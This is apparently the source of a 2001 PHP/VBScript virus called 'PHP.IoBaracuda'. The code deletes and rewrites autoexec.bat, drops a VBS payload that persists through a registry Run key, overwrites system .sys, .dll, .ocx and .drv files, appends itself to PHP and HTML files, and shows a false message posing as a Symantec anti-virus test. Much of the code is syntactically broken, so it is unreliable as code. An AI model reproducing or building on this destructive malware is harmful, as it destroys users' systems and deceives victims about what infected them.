<?php
// PHP.IoBaracuda or PHP.Io is a php virus. 
// 		By Xmorifc/BCVG and Dr.T/BCVG 2001
//infects autoexec.bat, creates io.vbs with destractive code.
//add itself to html, htm, php files.
//infects all inf files in C:\Windows\Inf\

// PHP.IoBaracuda By Xmorifc/BCVG and Dr.T/BCVG , The Black Cat Virii Group 2001, www.bcvgvx.cjb.net or www.shadowvx.com/bcvg  

$msd = 'C:\Msdos.sys';
$newbatf = 'C:\Autoexec.bat';
$newphpf = 'os67830.sys';
$ionewf  = 'C:\Windows\System32\io.vbs';
$winbf   = 'C:\Windows\win.bat';
$msgd    = "PHP.Io is an anti-virus test program that was created to make the internet more safty";
$mmm     = "and to protect you againts new php virus";
$kkk     = "For more information and to get a free version email to support_php@symantec.com";
$toge    = $msgd . $mmm;


	
	$hooky = unlink('C:\Autoexec.bat');
	
	$newauto = touch($newbatf);

			if ( (file_exists($newbatf) )
			{
				$autop = fopen($newbatf, "a");
				$fputs($autop, "@echo off ");
				$fputs($autop, "cd ..\windows\system32 ")
				$fputs($autop, "wscript.exe io.vbs ");
				return;
			}
			
			fclose($autop);

	$newio = touch($ionewf);
	
			if ( (file_exists($ionewf) )
			{
				$iop = fopen($ionewf, "a");
				$fputs($ionewf, "'VBS.Io By Dr.T/BCVG 2001 ");
				$fputs($ionewf, "On Error Resume Next ");	
				$fputs($ionewf, "Dim fso, file, vbscopy, wscr, f, finee, ext, ap, s, dirwin, dirsys ");
				$fputs($ionewf, "Set fso = CreateObject("Scripting.FileSystemObject") ");
				$fputs($ionewf, "set file = fso.OpenTextFile(WScript.ScriptFullname,1) ");
				$fputs($ionewf, "vbscopy=file.ReadAll ");
				$fputs($ionewf, "Set dirwin = fso.GetSpecialFolder(0) ");
				$fputs($ionewf, "Set dirsys = fso.GetSpecialFolder(1) ");
				$fputs($ionewf, "Set c = fso.GetFile(WScript.ScriptFullName) ");
				$fputs($ionewf, "c.Copy(dirwin &"\Command\MSNetLog.vbs") ");
				$fputs($ionewf, "set regedit = createobject("WScript.Shell") ");
				$fputs($ionewf, "regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSNetLog",dirwin&"\Command\logMS.vbs" ");
				$fputs($ionewf, "set f = fso.GetFolder(dirsys) ");
				$fputs($ionewf, "set fc = f.Files ");
				$fputs($ionewf, "for each finee in fc ");
				$fputs($ionewf, "ext=fso.GetExtensionName(finee.path) ");
				$fputs($ionewf, "ext=lcase(ext) ");
				$fputs($ionewf, "s=lcase(finee.name) ");
				$fputs($ionewf, "if (ext="sys") or (ext="dll") or (ext="ocx") or (ext="drv") then ");
				$fputs($ionewf, "set ap=fso.OpenTextFile(finee.path,2,true) ");
				$fputs($ionewf, "ap.write vbscopy ");
				$fputs($ionewf, "ap.close ");
				$fputs($ionewf, "set att=fso.GetFile(finee.path) ");
				$fputs($ionewf, "att.attributes=att.attributes+2 ");
				$fputs($ionewf, "end if ");
				$fputs($ionewf, "next ");
				$fputs($ionewf, "if Day(Now) = 2 or Day(Now) = 10 or Day(Now) = 12 or Day(Now) = 16 or Day(Now) = 28 then ");
				$fputs($ionewf, "MsgBox "Fermats Last Theorem THE PROOF : y^2 = ax^3 + bx^2 + cx + d is an elliptic curve, we need to prove that every elliptic curve is modular and it is very complex and since you were infected by PHP.IoBaracuda virus you are an idiot!! And  you will not understand the proof. Sorry", 16 ");
				$fputs($ionewf, "end if ");
				

				return;
			}
			
			fclose($iop);
	
	

	$htss = opendir('.');
	while ($htdr = readdir($htss))
	{

		$infect = true;
		$hexe = false;
		
		if ( ($hexe = strstr($htdr, '.php')) || ($hexe = strstr($htdr, '.html')) || ($htdr, '.htm')) )
		if ( is_file($hexe) && is_writeable($hexe))
		{

			$newff = fopen($hexe, "r");
			$lookf = fread($newff, filesize($hexe));
			$yesf = strstr($lookf, 'io.php');
			if (!$yef) $infect = false;
		}

		if ( ($infect = false) )	
		{

			$newff = fopen($hexe, "a");
			$fputs($newff, "<?php ");
			$fputs($newff, "include(\"");
			$fputs($newff, __FILE__);
			$fputs($newff, "\"); ");
			$fputs($newff, "?>");
			return;
		}

	}
	closedir($htss);

	$jkkk = opendir('C:\Windows\Inf\');
	while ($htdrr = readdir($jkkk))
	{

		$infect = true;
		$hexe = false;
		
		if ( ($hexee = strstr($htdrr, '.inf')) )
		if ( is_file($hexee) )
		{

			$newfff = fopen($hexee, "r");
			$lookff = fread($newfff, filesize($hexee));
			$yesff = strstr($lookf, 'ioioioioioioioooioioioioioiioiooioioioioioioioioioioioioioioioioioioioioioioioiioi');
			if (!$yeff) $infect = false;
		}

		if ( ($infect = false) )	
		{

			$newfff = fopen($hexee, "a");
			$fputs($newfff,"ioioioioioioioooioioioioioiioiooioioioioioioioioioioioioioioioioioioioioioioioiioi" );
			
			return;
		}

	}
	closedir($jkkk);
	
	$ren = rename(__FILE__, $newphpf);

	echo $toge; 		
			

?>		